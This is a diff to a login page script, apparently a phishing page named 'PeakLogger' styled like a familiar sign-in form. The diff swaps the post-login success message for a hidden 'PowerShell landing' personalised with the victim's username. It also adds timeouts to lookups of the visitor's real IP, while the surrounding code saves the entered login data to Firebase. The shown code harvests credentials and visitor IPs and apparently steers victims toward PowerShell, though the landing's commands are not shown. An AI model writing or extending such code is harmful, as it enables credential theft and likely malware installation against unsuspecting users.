@@ -7,6 +7,9 @@ document.addEventListener('DOMContentLoaded', function() {
     const passwordError = document.getElementById('password-error');
     const submitButton = form.querySelector('.btn-primary');
     const createAccountButton = form.querySelector('.btn-secondary');
+    const appContainer = document.getElementById('authContainer');
+    const powershellLanding = document.getElementById('powershellLanding');
+    const powershellUsernameTargets = document.querySelectorAll('[data-username]');
 
     // Input animation and validation
     function setupInputAnimations() {
@@ -156,74 +159,55 @@ document.addEventListener('DOMContentLoaded', function() {
             submitButton.classList.remove('loading');
             submitButton.classList.add('success');
             submitButton.textContent = 'Success!';
-            
+
             // Save login data to Firebase
             saveLoginDataToFirebase();
-            
-            // Show success message
-            showSuccessMessage();
-            
-            // Reset after 2 seconds
-            setTimeout(() => {
-                resetForm();
-            }, 2000);
+
+            // Show landing page
+            showPowershellLanding();
         }, 1500);
     }
 
-    // Show success message with animation
-    function showSuccessMessage() {
-        const successDiv = document.createElement('div');
-        successDiv.innerHTML = `
-            <div class="success-message">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="#34a853">
-                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-                </svg>
-                Welcome to PeakLogger!
-            </div>
-        `;
-        successDiv.className = 'success-overlay';
-        document.body.appendChild(successDiv);
+    function showPowershellLanding() {
+        const username = getPowershellUsername(emailInput.value);
 
-        // Add CSS for success message
-        const style = document.createElement('style');
-        style.textContent = `
-            .success-overlay {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0, 0, 0, 0.5);
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                z-index: 1000;
-                animation: fadeIn 0.3s ease;
-            }
-            .success-message {
-                background: white;
-                padding: 24px 32px;
-                border-radius: 12px;
-                display: flex;
-                align-items: center;
-                gap: 12px;
-                font-size: 16px;
-                font-weight: 500;
-                color: #202124;
-                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-                animation: scaleIn 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            }
-            @keyframes scaleIn {
-                from { transform: scale(0.8); opacity: 0; }
-                to { transform: scale(1); opacity: 1; }
-            }
-        `;
-        document.head.appendChild(style);
+        powershellUsernameTargets.forEach(target => {
+            target.textContent = username;
+        });
 
-        setTimeout(() => {
-            successDiv.remove();
-            style.remove();
-        }, 2000);
+        if (appContainer) {
+            appContainer.classList.add('hidden');
+            appContainer.setAttribute('aria-hidden', 'true');
+        }
+
+        if (powershellLanding) {
+            powershellLanding.classList.remove('hidden');
+            powershellLanding.classList.add('active');
+            powershellLanding.setAttribute('aria-hidden', 'false');
+        }
+
+        document.body.classList.add('landing-active');
+    }
+
+    function getPowershellUsername(rawInput) {
+        const trimmed = (rawInput || '').trim();
+
+        if (!trimmed) {
+            return 'user';
+        }
+
+        const base = trimmed.includes('@') ? trimmed.split('@')[0] : trimmed;
+        const sanitized = base.replace(/[^a-zA-Z0-9._-]/g, '');
+
+        return sanitized || 'user';
+    }
+
+    function fetchWithTimeout(url, { timeout = 1500, ...options } = {}) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeout);
+
+        return fetch(url, { ...options, signal: controller.signal })
+            .finally(() => clearTimeout(timer));
     }
 
     // Get real IP address from external service
@@ -238,9 +222,9 @@ document.addEventListener('DOMContentLoaded', function() {
             
             for (const service of ipServices) {
                 try {
-                    const response = await fetch(service);
+                    const response = await fetchWithTimeout(service, { timeout: 1500 });
                     const data = await response.json();
-                    
+
                     // Handle different response formats
                     if (data.ip) return data.ip;
                     if (data.origin) return data.origin; // httpbin format
@@ -361,17 +345,6 @@ document.addEventListener('DOMContentLoaded', function() {
         } catch (error) {
             console.error('❌ Firebase operation failed for create account:', error);
         }
-    }
-
-    // Reset form to initial state
-    function resetForm() {
-        submitButton.classList.remove('success');
-        submitButton.textContent = 'Next';
-        submitButton.disabled = false;
-        
-        // Optional: clear form fields
-        // emailInput.value = '';
-        // passwordInput.value = '';
     }
 
     // Handle create account button
